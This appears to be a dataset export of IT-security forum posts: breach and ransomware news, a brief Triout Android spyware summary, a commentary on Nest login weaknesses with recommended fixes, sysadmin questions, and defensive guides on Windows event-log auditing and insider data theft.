While many of the IT systems were quickly taken offline to prevent further spread of the infection, customers were met with non-functioning payment systems or just closed doors. Fortunately, the company keeps regular backups and was able to restore their systems without paying a ransom.High-Profile Instagram Accounts Being HackedSeveral high-profile Instagram accounts were hacked and held hostage recently, with some accounts being deleted even after a payment was sent. Though many victims have contacted Instagram multiple times regarding access to their accounts, some were sent automated responses while others regained control of their accounts without hearing from the company.Google Chrome Cracks Down on ExtensionsWith dozens of new extensions being added to Google’s Chrome Web Store every day, it has become increasingly difficult for Google to police for malicious apps.

Additionally, Chrome has implemented 2-step verification for all developer accounts to curb the volume of hacked apps made available.Port of San Diego Hit by RansomwareIt was revealed last week that the Port of San Diego, which controls over 34 miles of coastline, suffered a ransomware attack that temporarily knocked out their computer systems.

2158706,"Analyzing “Triout”, a recent Android spyware","With the increased use of Android devices, malware developers have ramped up their efforts to infiltrate Android features for their own spying purposes.First discovered by Bitdefender’s machine learning algorithms, we’ve identified a new Android spyware called Triout. The spyware is likely hosted on attacker-controlled domains or third-party marketplaces. Some of the spyware capabilities include the following (provided by Bitdefender Lab’s researchers):Records every phone call (literally the conversation as a media file), then sends it together with the caller id to the C&C (incall3.php and outcall3.php)Logs every incoming SMS message (SMS body and SMS sender) to C&C (script3.php)Has capability to hide selfCan send all call logs (“content://call_log/calls”, info: callname, callnum, calldate, calltype, callduration) to C&C (calllog.php)Whenever the user snaps a picture, either with the front or rear camera, it gets sent to the C&C (uppc.php, fi npic.php orreqpic.php)Can send GPS coordinates to C&C (gps3.php)In a more detailed look at Triout in our analysis, Triout  “is completely unobfuscated, meaning that simply by unpacking the .apk file, full access to the source code becomes available. This could suggest the framework may be a work-in-progress, with developers testing features and compatibility with devices.” The C&C server (where the malicious app sends the collected data) has been active since May.All that to say, just a quick reminder to be wary of downloading apps from unofficial areas! ",11
1645199,Looks Like 8 More Cyberheists By North Koreans,"Gottfried Leibbrandt, chief executive of the world’s largest interbank funds-transfer system SWIFT, has said repeatedly that the prospect of cybercrime is what keeps him awake at night.The ""Society for Worldwide Interbank Financial Telecommunication"" co-op processes billions of money transfer messages per year between banks.  They serve more than 10,000 banks across 200 countries with varying levels of sophistication.The Wall Street Journal quotes him: “I think there is absolutely a shared sense of urgency,” Mr. Leibbrandt said. “There is also an appreciation of the complexity of this problem.” They continued with: “We knew cyberrisk was a big deal for the industry, and it was only a matter of time before we saw something big happening,” he said. “But I had not expected it in this form: Someone finding their way into a bank’s key systems like this, and getting away with this amount of money out of the blue.”Up to now, cyberheists in four instances have been documented, but this article revealed that there's more. Computer security firm FireEye Inc., hired by Bangladesh Bank to investigate its breach, is looking at suspected attacks on at least eight other banks, all of them in Asia.“We are seeing the same threat actors target some of our customers,” said Bryce Boland, chief technology officer for the Asia-Pacific region at FireEye. “I’m fairly confident other breaches are taking place.”What To Do About It It is clear that at this point in time, any organization needs to step up their cybersecurity game. Specifically, they need to put programs in place to manage the ongoing problem of social engineering and spear phishing which has been causing almost all of the major data breaches at companies like Target and governmental agencies like the Office of Personnel Management.SWIFT continues to assert that their messaging system is safe, but if participating banks are hacked and bad guys can get their hands on the authorizations and confirmation protocols to use SWIFT, that is a moot point. Individual Financial Institutions need to increase their security, specifically their security awareness training programs to make sure employees do not fall for phishing attacks. Once employees spot the red flags related to phishing, they can click KnowBe4's free Phish Alert button to delete the phish and get it forwarded including all headers to your Incident Response team.Get your free Phish Alert buttonhttps://www.knowbe4.com/free-phish-alert﻿",11

However, I believe there's one aspect that can feel all the more time-consuming during the process…and that's documentation. If you’ve tackled PCI compliance in the past, there's a chance you might remember that PCI DSS 2.0 wasn’t always clear on the kind of documentation needed. Because of this ambiguity, many people — such as auditors, QSAs or security professionals — had questions on just what they had to provide.Luckily, PCI 3.0, 3.1 and 3.2 include additional detail. Instead of simply being told to document something, you’ll know what you need to document. Our very own Chief Information Security Officer, Kurt Hagerman, has put together a list of 5 items/areas you should focus on documenting to make PCI audits just easier, which you can check out here: https://www.armor.com/resources/documenting-pci-compliance/What are your thoughts on these suggestions?

I could log all file access and look for things that seem suspicious, but that seems like overkill.My suggestion is that we have a number of dedicated PCs that have Internet access (we've got some spare) that are totally separated from the other network resources (whether VLAN or completely different subnet) and people can happily use them.This is a no-cost, no-brainer as far as I can see.  We already restrict use of USB drives/CD/DVD so it's easy enough to ensure that no-one can copy a file to removable media and take it to one of those PCs.Any other thoughts/approaches worth considering? ",0

1709835,Security Stats To Start Your Week: 7/11 (hehe) Edition,"Hey everyone,Each week our content team pulls together what we think are the most interesting statistics from InfoSec news stories each week. I'm copy and pasting it below so you can read it without leaving Spiceworks. Check it out:10 million Android phones infectedFirst detected in November, mobile malware Shedun/HummingBad is spreading at an incredibly rapid pace, using drive-by-downloads and multiple exploits that primarily target older versions of Android. Once on a device, the malware silently installs fraudulent apps, displays illegitimate ads, and can even survive normal factory resets. (Ars Technica)2 pieces of malware now specifically tailored for MacsResearchers at Malwarebytes report ""Eleanor"" is only the second ""true"" piece of malware discovered in the wild that was tailored specifically for Macs (the first being the KeRanger ransomware). If executed, it can install backdoors and grant attackers remote access to machines, allowing them to delete, modify, and steal files, execute commands and scripts, create packets and send emails without any restrictions — as well as capture images and footage from webcams (so maybe Zuckerberg is on to something).  (ZDNet) 50 percent of SMBs have been breachedHalf of the IT leaders at businesses with between 100 and 1,000 employees who responded to a new Ponemon Institute survey reported their company had suffered at least one data breach in the last 12 months. Three out of four respondents said the exploits behind the breaches evaded their antivirus solutions. (CSO)1 in 3 Wendy's fast food restaurants hackedAfter initial estimates that perhaps 300 restaurants had been infected with point-of-sale (POS) malware, the fast food giant now believes more than 1,000 locations have been compromised. No estimates have been released as to how many customers may have been affected, but Wendy's is offering potentially impacted customers who paid with a credit card one year of complimentary fraud consultation and identity restoration services. Would you like fries with that? (WeLiveSecurity)29 percent of all web traffic comes from botnetsCat videos and Facebook updates may constitute a big portion of Internet traffic, but they've got nothing on bots. According to a new study by Imperva, only 51 percent of web traffic is ""human based"". The rest comes from bots, with a big portion devoted to scraping, spamming, and hacking. (SC Magazine)  400,000 D-Link Wi-Fi devices at riskA serious security flaw has been discovered in D-Link networked products that could give attackers the opportunity to overwrite adminstrator passwords in home Wi-Fi cameras. Thanks to a stack overflow issue, an attacker only needs to add a single line of code to hijack a device. (ZDNet)5 new ransomware decryption toolsIt's not all bad news. Recent efforts by security researchers at AVG and elsewhere have provided ransomware victims with more tools they can use to recover their files without paying off criminals.

1425046,These Kids Know the Importance of Cybersecurity…Do You?,"It’s amazing to know that some of the kids in today’s world understand computers in a way that will surely revolutionize cybersecurity in the future. In Marketplace’s “Kids Start Honing Their Cybersecurity Skills Early”, even fourth grader, James Estrella expressed his knowledge on cybersecurity:“Estrella said he already knows more about computers than his parents. To have good security you need to get rid of bugs in your code, he said. Oh, and to make strong passwords. Otherwise, he pointed out, you could get hacked.”It’s advice like Estrella’s that provides an excellent reminder on the importance of cybersecurity.  These tech minded kids have certainly taken a leap towards protecting themselves from future cybersecurity breaches… but are we doing the same with our own networking systems? It’s time we eliminated security risk! Identifying potential threats and vulnerabilities that are being created both from employees and external entities and enables you to remediate issues quickly.

438489,Thoughts from a Symantec Security Expert on Google's Nest,"I believe it was Chuck D who once said ""Once again, back is the incredible; The rhyme animal; The untenable"" SYMANTEC...(and the smart guys will insert:  Publick Enemy Numbah 1) but we're here to talk about wired appliances!  The Internet of Things!  Thermostats!Wait...what?Yeah man...Nest.  Google's bright new baby.  Our man Vince Kornacki﻿, ﻿Sr Security Consultant, offers some of his thoughts on Nest and why a wired thermostat is a little more threatening than you may think.  Dig it:Digging Deeper into Nest Security﻿Bob Shaker's compelling ""ConsiderSecurity Before Building Your Nest"" blog post got me thinkingabout Internet of Things (IoT) security. In case you've been on the moon,earlier this month Google announced the acquisition of home automation companyNest Labs for $3.2 billion, thrusting the Internet of Things into thespotlight. According to Gartner the Internet of Things will include 26 billion devices by 2020.26 billion! Attackers are likely salivating over such an incredible number ofdevices just waiting to be hacked. So let's ride the trending wave and considerNest Labs, a representative sample of Internet of Things technology.Nest Labs currently offers two lines of smart home devices:thermostats and smoke / carbon monoxide detectors. Nest devices include supercool self-learning capabilities and convenient remote administration facilitiesthrough a web interface and Android / iPhone mobile applications. But whatabout security? As Bob pointed out, you certainly need to consider securitybefore stashing eggs in your Nest. So what could happen if malicious attackerstook control of your Nest devices through that handy dandy web interface? Very.Bad. Things.For example, attackers with access to your Nest LearningThermostat could simply turn off your heat. Today in Chicagothe temperature is -16 Fahrenheit. That's not the wind chill, mind you, but thetemperature. That's freaky cold. If attackers turned off the heat in yourtrendy Chicago loft the pipes would freeze in short order, resulting inproperty damage and expensive repairs. A more profitable avenue of attack isrobbery. Attackers could infer when you're home based on your Nest LearningThermostat settings and Auto-Away status.After quickly building a profile attackers would know exactly when you're nothome, and therefore would know exactly the best time to rob your trendy loft.But what about your home security system? I would be shocked if Nest doesn'toffer a learning home security system in the coming years. So no problem there,attackers could simply disable your home security system through that handydandy web interface.What other Nest smart home device vulnerabilities might belurking in the coming years? Well that depends on what new product lines Googleintroduces into the Nest portfolio. Nest has been surprisingly quiet regardingfuture product direction. However, last year Nest announced a developer API thatallows third party developers to interface with the Nest Learning Thermostat.If this developer API is any indication of things to come, the possibilitieswill be endless. Let's brainstorm a few prospects, some of which Nest hasalready suggested:Smart window blinds? Attackers could open yourblinds and become technologically savvy Peeping Toms. Hopefully your mom won'tstumble across the raunchy video that the attackers upload to the Internet.Smart washing machines and dryers? Attackercould turn up the heat and shrink your favorite clubbing shirt. Yup, the blackone with that fierce dragon and snazzy blue flames. Ouch.Smart refrigerators and freezers? Attackerscould turn up the heat and spoil your Kobe Filet Mignon. Takeout, anybody?Smart aquariums? Attackers could turn up theheat and fry your poor tropical fish Arnold Schwarzefisher. Sushi, anybody?Smart toasters? You remember the infamous USBToaster, don't you? Well I hope you like your toast burnt to a scorched blackcrisp!Privacy considerations are another issue altogether. Google haspromised that Googlefying your Nest data will be 100% opt-in, but how hardwould it be to bury the requisite opt-in clause within a terms of service formthat 99% of us do not even pretend to read? And let's not even think about whatmight happen in the future when Nestdevices interface directly with your brain. Researchers arecurrently ""miniaturizing single electrode devices that can be placed inyour hair and read electrical activity from the brain through a technologycalled electroencephalography."" You thought Google stockpiled a lot ofdata before? Well monitoring your Internet searches (through Google.com), browsing habits (through Chromebrowsers), and smartphone usage (through Android devices) pale in comparison tothe privacy ramifications if Google could monitor your brain! And will bidirectionalcommunication with the brain eventually be possible? I for one donot want Google to hack my brain!So with all of these potential dangers lurking in the shadows,the most important question is simple. Are the Nest web interface and mobileapplications secure? First I must state that I did not in any way conduct anytype of penetration test against the Nest web interface. However, I can commenton certain design choices that Nest deliberately selected in order to make the webinterface as user-friendly as possible. These design choices were conscientiousdecisions and therefore do not fall under the responsible vulnerabilitydisclosure process:The Nest login form doesnot explicitly disable the ""AUTOCOMPLETE"" attribute for the usernameand password parameters. Consequently, attackers with subsequent workstationaccess could compromise stored Nest authentication credentials.The Nest login page does not enforce an effectiveaccount lockout mechanism. Users can successfully login after 100 failed loginattempts. Consequently, attackers can launch brute force horizontalpassword guessing attacks.The Nest password policy is weak. Passwordsare only required to be six characters in length, and password complexity requirementare not enforced. Consequently, attackers can also launch verticalpassword guessing attacks.The Nest web interface does not include the""X-Frame-Options"" header. Consequently, attackers can launchclickjacking attacks.Like virtually all online authenticationmechanisms, the Nest web interface is susceptible to phishing (and spearphishing) attacks.A user-friendly web interface is important, but a secure webinterface is even more important. So what should Google do? First and foremost,Google should strengthen the security of the existing Nest web interface andmobile applications. For example, the following solutions would address thesecurity concerns listed above:Explicitly disable form autocomplete. Set the""AUTOCOMPLETE"" attribute to ""OFF"" for the username andpassword parameters on the Nest login form.Enforce an effective account lockoutmechanism. For example, lock Nest accounts for 20 minutes after three failedlogin attempts within a 30-minute window.Institute a strong password policy withsufficient password length and complexity requirements For example, requireNest passwords to be eight characters in length and contain at least oneuppercase letter, lowercase letter, number, and special character.Prevent clickjacking attacks against the Nestweb interface. Set the ""X-FRAME-OPTIONS"" header to ""DENY""or ""SAMEORIGIN"".Educate Nest users regarding phishing andother essential security considerations.Google has a golden opportunity in their hands, and could verywell cultivate Nest into a powerful and profitable line of ingenious products.However, security must be designed into each and every Nest product blueprint.Otherwise your eggs could get cracked, and Google could end up with a whole lotof egg on their face. Let's wrap things up with one last interesting tidbit.Every page within the Nest web interface includes a ridiculously oversized NestLabs logo hidden within the HTML comments:Less the copyright information, that's 1,621 extraneous bytestransmitted within every page of the Nest web interface. Google is known forminimizing page size and load speed by removing extraneous content wheneverpossible, even going so far as to strip spaces and newline characters. Take alook at the page source of Google.com tosee what I mean. I would be shocked if Google does not eliminate or at leastshrink this ridiculously oversized Nest Labs logo. However, with criticalsecurity and privacy considerations hanging in the balance, right now Googlecertainly has bigger fish to fry (hopefully on a smart stovetop).For more security predictions from Symantec experts, pleasevisit http://www.symantec.com/connect/blogs/2014-predictions-symantec-0.﻿I still think all this Internet of Things stuff is cool...but it skeevs me out a bit because I don't really want The Man (government, corporation, my dad...anyone) having easy knowledge of what I'm getting up to.If you like what Vince has to say, check out more of his stuff on Symantec Connect.  You can subscribe to his RSS feed and get all this sent to you.Hit me up if you need more info.  Happy to make the introduction to Vince or other experts at Symantec.BRING THE NOISE!",12

377779,Exchange OWA versus ActiveSync on personal devices - differences?,"I've just rolled out Exchange 2010. I've a policy that if people want to use ActiveSync on their personal phones, then they must have MDM installed and agree that I have the power to remote wipe their phones. A few users are unhappy with this.From a security point of view, I get the need to have remote wipe capability. I get the need to use MDM rather than just use Exchange's limited remote management functionality (I use Meraki). I also get users' reluctance to cede such power over their personal phones.A solution is to just tell those users to use OWA through their phones' browsers.From a security point of view, what are the main differences between OWA and ActiveSync? It seems that ActiveSync is very locked down and managed (I can control which devices can use it, I can manage those devices), whereas OWA is a free-for-all (any computer or phone can be used and isn't monitored or managed at all).ActiveSync enables offline viewing - so if a phone is stolen and I don't wipe the phone, e-mail will be viewable even if the account is disabled. So this is perhaps a greater security risk than OWA? Then again, doesn't Blackberry use OWA to convert messages and download permanently to the phone?Am I doing the right thing in telling users to either install MDM or use OWA?    ",0

2166487,Do you believe UK small businesses are behind in cybersecurity preparedness?,"Have you heard about the latest cyberattack? Which cyberattack am I referring to, you ask? Exactly.Welcome to the modern era of cyberattacks, where according to a recent report by Appstractor's new independent report titled “Under Attack: Assessing the struggle of UK SMBs against cyber criminals”, UK small businesses are being hit by on average five cyberattacks each year. Taking a deeper dive into the report, when asking the question “Is cyber security software keeping pace with the threat level?”, we find that: Less than half (44%) of IT decision makers in UK businesses believe that cyber security software for small businesses has managed to keep pace with the complexity of the threats they face, compared to the solutions being offered to larger companies.33% of small businesses think they are at greater risk from cyber-attack because cyber security software is not matching the high level of threat they face.I find the last point pretty interesting to see that small businesses feel at greater risk in terms of cybersecurity preparedness. We all know data is life or death for a business, which makes that data particularly vulnerable to attack. And, small businesses need to find a way to be empowered to fight against these attacks by getting help from a security vendor (like Dell’s SMB Security!) and loads of user education.Do you believe that UK small businesses are behind in cybersecurity preparedness?Feel free to expand on your answer if you so desire!",0

1885263,How do you build a comprehensive DDoS attack prevention plan?,"According to a Hacker News post today - a number of popular sites and services have been experiencing issues or have been down for many users, including Twitter, SoundCloud, Spotify and Shopify. The cause appears to be an outage of DNS provider Dyn, as a result of a DDoS attack.In our post yesterday we discussed that, according to Akamai, in the first quarter of this year businesses experienced 125 percent more attacks compared to last year, showing the true importance of DDoS attack prevention.see full Akami Q1 2016 Security Infographic hereKaspersky notes that these DDoS attacks can cost businesses anywhere from $52,000 to $440,000, depending on the size of the business. Due to the nature of a DDoS attack, businesses may also miss out on critical business opportunities while sites are down and servers are unresponsive. Small and midsize businesses can sometimes make the mistake of ignoring DDoS attacks as a potential threat vector. Given the greater publicity of DDoS attacks on their larger counterparts, smaller organizations often assume safety in obscurity.In short, organizations of all sizes need to prioritize taking precautionary measures to avoid successful DDoS attacks. And though you cannot always completely prevent DDoS attacks, there are steps you can take to secure your environment and at least mitigate the damage.So SpiceHeads, following the headlines this morning, I wanted to see what steps your businesses take. Do you have a DDoS attack prevention plan? What best practices do you follow, and what do you have in place to safegaurd your environment, or in the event of an attack, mitigate the damage?",11

But I understand that Intranet SSL certificates are to be discontinued in 2015 and the only way to get around this is to get a FQDN for the device which will have a certificate. From my understanding we may have to obtain a separate top level domain name for our project(s) and possibly then use subdomains for each clients  e.g. register abc.com and then for client1 we have client1.abc.com and purchase a certificate for  that and place in our device before shipping to the customer's site.﻿ (Or use some sort of wild card certificate)Is this idea right or have I gotten it wrong?",0

2054288,Employee Monitoring. Good or Bad?,"I came across a post in the Q&A section this morning that got me thinking. Employee monitoring software seems to be becoming ever more prevalent in the workplace and I don't know where I stand on whether this is a good or bad thing. Personally I think I would feel uncomfortable having that level of scrutiny applied to me and I'm glad I don't work in an environment where such tools are deployed, however, I certainly understand the need for employers/businesses to protect their interests and sensitive data, especially in governments and/or intelligence communities or businesses with proprietary technology/intellectual property concerns.A major concern for me is the potential damage to a work culture that fosters trust and employee commitment and motivation. Electronic surveillance of employees appears incongruent with such an environment.In my experience with committed employees, there is as much cross-over at home between work and personal business as there is at work. That is part of the discretionary energy, the energy that employees voluntarily contribute above and beyond expectations, obviously this is what employers hope to earn. Therefore the lines between abuse and cross-over are blurred which makes this a grey area for me.I understand the need, not sure if it makes me comfortable. I'm intrigued to hear your perspective on this topic.",1

236288,Fighting False Positives Is Just As Hard As Fighting Real Malware,"A few weeks back Avira, a major antivirus company wreaked havoc on Windows PCs wby releasing a Service Pack that bricked machines by blocking boots, and banning the launch of almost every Windows executable. Ouch. Eugene Kasperky has a good article about this, with some graphs that compare False Positives of leading antivirus products. Very interesting. He started out with: ""Any software vendor sometimes makes unfortunate mistakes. We are human like everybody else and we make mistakes sometimes, too. What’s important in such cases is to publicly admit the error as soon as possible, correct it, notify users and make the right changes to ensure the mistake doesn’t happen again (which is exactly what we do at KL). In a nutshell, it’s rather easy – all you have to do is minimize damage to users.But there is a problem. Since time immemorial (or rather memorial), antivirus solutions have had a peculiarity known as false positives or false detections.

119706,Server Intrusion Prevention System: Do I Need It?,"Hay guys!I'm working on next year's budget and I would like to eliminate the redundant services we're purchasing from a managed service provider.  One of these services is server IPS (intrustion prevention system).  Basically for $10k per year they install an agent on our servers and watch for intrusions.  I'm finding it very hard to justify that cost when we monitor the event logs constantly and get alerted of failed login attempts and locked out user accounts.Why do I need ""server IPS"" when we have a network IPS and we monitor the eventlogs internally?",5
677262,SSL Certificate for use with SSL Inspection on Zyxel USG110,"I have a query regarding the SSL inspection functionality on the USG110 series and above. I have a requirement to provide a public Wi-Fi access point, and I’m looking at using a USG110 to provide application control, and content filtering which I can get working ok with HTTP traffic, the challenge I’m having is with HTTPS traffic and being able to use application control and content filtering with this type of traffic to provide protection for the client I’m working with.I have been able to use IDP to block traffic based on the signature for traffic for example I have been able to block HTTPS to the Spotify website and then with app control also block access to the Spotify desktop application. What I’m looking to do is not have to create a rule for each website or application we want to block through IDP as with the Spotify example it did not block all elements of Spotify and I had to use a mixture of App Patrol and IDP. This is where I’m looking to use the SSL inspection feature along with App Patrol and Content filtering on the USG110 to give me a complete overview of all traffic being passed through the network and apply polices to this traffic.The query I have around SSL inspection is regarding the SSL certificate, as it is a public Wi-Fi access point I’m unable to control the devices that will connect to this network and thus cannot install the self-signed certificate on to each device so it will recognise any HTTPS traffic that is scanned by the USG as being from a trusted source. If I was to purchase a third party SSL certificate from a certificate authority and then import this onto the USG would this take away the need for the self-signed certificate on the USG to be used, and allow the HTTPS connection to an external source to show as a trusted connection on the devices?﻿Thanks in advance for your response.",0

I hate to start picking out a camera before I know what server to run so everything works well together. That would be the next question though, what are good camera's these days.My last job (3 years ago) I had Axis camera's set up on a Milestone system that worked beautifully. That would be more costly than what we can spend on this job though. This set up I am doing now needs to be just a step above having a DVR. I actually brought up using just a cheap dvr at each site and the powers that be want to have everything linked back to a server and IP camera's. So what are you guys thoughts on current systems?",0

273025,Shoretel security is a joke,"Here is my conversation with our shoretel partner. Am I wrong to assume that this is a blatantly risky security practice. Does anyone else run shoretel for VoIP? Do you have your firewall disabled too?I say:Hi Brett,This is Karl with [company]. I was wondering if you had or know where I can find a list of firewall exceptions that Shoretel needs in order to run. Currently the whole firewall is turned off on the server and I’m concerned about security.He says:You are talking about the windows firewall on the server itself correct?  ShoreTel requests that this be disabled completely on the server.  The newer versions are requiring it to be disabled for it to be installed.  Do you have specific concerns about the security of that server?I say:Brett,Thanks for the reply. Yes, I am talking about the windows firewall. It is against our security policy to leave the Windows firewall disabled. With it disabled I now have a huge hole in security. If this server was to be compromised, all VoIP traffic would be vulnerable as well as creating an easy foothold in the network to use as leverage against other servers on the same VM host and network. Having the firewall disabled is not in accordance with any ISO/IEC security policy nor any best practice. There must be certain services, ports, and/or protocols that can be opened while windows firewall is operable to provide the needed functionality to shoretel while maintaining security. Crossing my fingers and hoping my server doesn’t get owned isn’t an option with millions of dollars of intellectual property sitting on the same VM host and network. If you don’t have access to the protocols, services, and ports that shoretel needs to run correctly can you point me in the right direction?",0

Currently few of my management need to access those sites from Mobile phones.(Android / Apple) So I created a group in active directory call INTERNET FULL ACCESS.I allowed them internet full access from barracuda web filter, But still they can't access the websites from their mobiles which I have blocked in staff WiFi.  ﻿Further I have checked inBlock/Accept > Account view , there is no records of IP addresses which are getting by mobile phones. Which mean for mobile phones web filter is not generating any events.Mobile phone users are login in to WiFi network by giving their normal user name and password of their user accounts.  ﻿How to overcome this situation ? I need to give internet full access for mobile phone users Thanks and Regards,Jayan ",5

160968,Box Operator v3.2 does not start when Trend Anti-Virus is installed,"Scenario:A program called the Box Operator 3.2, which I believe was manufactured by Konica Minolta is being used in my client's environment on an Oce VarioLink 5022 all-in-one copier/printer etc.  The Box Operator drivers and console is installed centrally on the print/fileserver and the client for Box Operator is installed on the user's computers and a shortcut is displayed on the desktop. When the user clicks on the icon, a windows explorer window should open displaying an additional icon resembling a copier. When you double-click on this 2nd icon it displays a lightning bolt to indicate that it's connected. A final click will open the Box Operator and display all user boxes. At this point a user can click on any box they have access to and either download or upload files for sharing. Problem: User's now have Trend Micro Anti-virus installed on the server and all user workstations. When the user logs in to the computer and try to open the Box Operator, it just displays an hour glass and does not display any further messages or actions. The user would have to reboot the computer to get the Box Operator to work again.Solutions:The only real fix to this issue so far has been just to disable Trend completely or stop/restart the services. A user cannot do this without the password, but this has allowed the Box Operator to open afterwards. But this is not a real solution.  We have made several attempts to disable the FW on the Trend client's, exclude the path of the the program under all users, and the user's profile. We have used a process monitor to see what start's when the program starts but we have been unsuccessful in locating an executable file directly related to the program. We have only seen the regedit.exe, and verclsid.exe processes start briefly. We have tried excluding these as well. I have tried contacting, Oce and Konica Minolta and they have been less than helpful to put it mildly. I am working with the Trend Micro Tech Support team to create groups with specific settings to allow everything that has to do with the Box Operator.Other Findings:-Not sure how we can either delay the start up of Trend or force the Box Operator to start before the user logs in. -We could try a different AV solution, but even with something simple like Microsoft Security Essentials there are still connectivity issues with the Box Operator. -There is no determined time frame that we can tell disconnects the Box Operator automatically, but we do know that the Box Operator will index and disconnect after it is idle for some period of time and Trend ultimately does not all the user to reconnect. ANY Help or ideas at this point would be appreciated. If you know anything about the Box Operator or about excluding programs for all users from Trend please share your thoughts. This is a tough one! Thanks in advance. -Justin ",0

679763,Question regarding ADAMM & retention rules for Backup exec 2014,"Sorry for the long winded post, I'm first setting the scenario, with the question to follow. I presently have a Backup exec 3600 R3 Appliance (for those of you not familiar its can be treated as if it was a regular server with DAS. I'm doing roughly 2.7TB of data on my DAS storage including both weekly fulls and incremental a week. The DAS is only 5.5TB large so, I’m beginning to get warnings that the space is low when i do my 2nd week worth of fulls.My understanding of ADAMM rules is that it will prevent expiring of backup sets if there is a non-expired dependent set around. I presently have my fulls with a 4 day retention on the DAS and my incremental with a 2 day retention and if everything goes to plan, my incremental will begin on day 3, ensuring a dependent backup set prior to the expiration on day 4. It then runs for a total of 5 consecutive days. Everything works as expected.I’ve now purchased a NAS for further disk storage and I’ve done some speed testing and determined it is most efficient to back up to the local disk then duplicate to the NAS so basically I need to implement D2D2D. My plan is to have a 30 day retention on my NAS.Given that the DAS & NAS are both ""disk storage"" will the ADAMM allow the ""local disk copy"" (stared) of the full to expire in the following scenario as it exists on another disk storage with longer retention? Or does ADAMM treat each disk storage as isolated so the full on DAS will be maintained with the incremental on the same storage.DAS------**full-4daysIncr-1 -2daysIncr-2 -2daysNAS------Full -30 daysIncr-1 -30 daysIncr-2 -30daysI hope this is clear.﻿",0

Host O/S is connected to a 212 domain. 3-4 applications that make specific authentication calls and looks through DNS etc need that traffic to route to the secure interface.My colleague's use a Host file (which I have access to) and have rules setup on their firewalls in conjunction with it.

876564,Are you using Windows Event Logs the right way?,"One of the great features in Windows that IT pros everywhere should be using is the Windows Event Log according to Russell Smith. In Petri IT Knowledgebase, Smith talks over the finer points of how you can easily detect security breaches in the Windows Event Logs – if you know what to look for, that is.  Before you can make use of the Event Log, you'll want to create a custom view ""to filter out [the] unwanted noise."" Here, Russell provides two resources, one for Windows Server 2012 R2 Event Viewer and another for querying XML Event Logs. If you don't quite feel like sifting through the mire, here's a quick guide (Note: You must first log in as an admin): Open Event Viewer from the Tools menu in Server Manager.In the Event Viewer window, expand Custom Views in the top left.Right click Custom Views, and select Create Custom View… from the menu.In the Create Custom View dialog on the Filter tab, select Last 24 hours from the Logged drop-down menu.Select By source and then Microsoft Windows security auditing from the drop-down menu.Select User Account Management from the Task category menu.Click OK.In the Save Filter to Custom View dialog, give the new custom view a name and click OK.﻿ After you've completed this, Russell advising changing your control and privilege management so that ""the event logs can become truly useful."" This will also make it easier to identify when things are off. A simple example: When a user's privileges have been modified or raised to administrator access, you should check to see if it is accompanied by a request for change. If it does not, then something's remiss. Russell outlines different event logs that should ring alarm bells such as changes in event logs and audit policy, changes in group policy and firewall settings, application problems, and account use management. If you see that your event logs have been cleared, for instance, it might indicate malicious activity on your network and someone has ""been trying to cover their tracks."" ﻿Do you check your Event Logs often? What strikes you as suspicious? ",11

2123830,5 Ways to Reduce the Risk of Employee Theft of Confidential Information,"Departing employees can be a big source of data leakage for organizations; in fact, there are at least 5 reasons why departing employees can be a real pain. So we need to take a closer look into how to reduce this risk.Of course, as soon as an employee leaves the company — whether because they quit or retired, were fired or laid off, or something else — you need to immediately deactivate all of the user’s accounts and terminate all access to corporate resources. But that’s not nearly enough. Weeks or months before the actual moment of termination, employees often know that they are planning to leave, or suspect that they are going to be fired or laid off. This gives them plenty of time to copy confidential information to take with them before you deactivate their accounts.Fortunately, even in these scenarios, there are 5 key ways to reduce the risk of employee theft of confidential information on their way out. Every organization should consider making these best practices part of their security strategy.1) Set up permissions properlyBecause we don’t know who will turn out to be a rogue employee, it’s essential to establish and enforce the principle of least privilege: Grant each user access to only the systems and data they need to do their jobs, and nothing more. In particular, follow these best practices for configuring access lists on your file servers.2) Monitor changes to permissionsOnce permissions are set up, we need to track and document all changes made to them. By making sure that all changes are authorized, we can reduce the risk of anyone getting access rights they don’t need, either accidentally or maliciously. Third-party solutions can automate change tracking, reporting and alerting, saving you time while reducing the risk of overlooking critical changes. If you use choose to native tools, the process is far more manual. For example, in order to spot changes to NTFS permissions, after you set up auditing on your file server, you need to track Event ID 4670:3) Monitor the activity of privileged users when they are accessing critical filesThe most efficient effective way to do this is with privileged user monitoring software, change auditing software or data leak protection (DLP) software. You can also use native tools, but they are not nearly as easy to configure and use. For example, if you want to determine who read a certain file on your file share, you’ll need to take multiple steps:Navigate to the required file share, right-click it and select “Properties”.Select the “Security” tab ? Click the “Advanced” button ? Go to the “Auditing” tab ? Click the “Add” button.Configure the following settings:Principal: “Everyone”; Type: “All”Applies to: “This folder, subfolders and files”Advanced Permissions: “List folder / read data”Click “OK” three times.Run gpmc.msc on your domain controller and create a new GPO.Edit the new GPO: Go to Computer Policy | Computer Configuration | Windows Settings | Security Settings. Then do all of the following:Go to “Local Policies” ? Select “Audit Policy” ? Under “Audit object access”, check both the “Success” and “Failure” checkboxes.Go to “Advanced Audit Policy Configuration” ? Select “System Audit Policies” ? Select “Object Access” ? Under “Audit file system”, check both the “Success” and “Failure ” checkboxes.On the same screen, under “Audit handle manipulation”, check both the “Success” and “Failure” checkboxes.Link the new GPO to the OU with your file servers and force Group Policy update by running the “gpupdate /force” command at the command prompt.Open the Event Viewer and search the security log for event ID 4663 with the string “Accesses: ReadData (or ListDirectory)”:This could be also helpful when you need to restore critical data that was lost somehow.4) Take control over data leakage methodsHere are some of the most common ways employees transfer data out of your network, and what you can do in each case:5) Encrypt data at the file system levelEncrypting the critical data on your file servers protects it, because even if a departing employee steals the data, they cannot read it except from your workplace. File system level encryption is offered by third-party vendors but it is usually not cheap, so the data you encrypt should be worth it.Implementing these 5 key best practices will dramatically reduce the risk of data theft by departing employees. Of course, they could still manually copy information from the screen on to paper, take photos of individual screens, or steal your decryption key. But all of these options are more complicated and time-intensive than just copying or transferring files electronically.Be aware that some of these 5 best practices are not cheap to implement and maintain, so be sure to carefully assess your risk and act accordingly, repeat the risk assessment and response process regularly, and make sure everyone follows user termination best practices scrupulously.",12

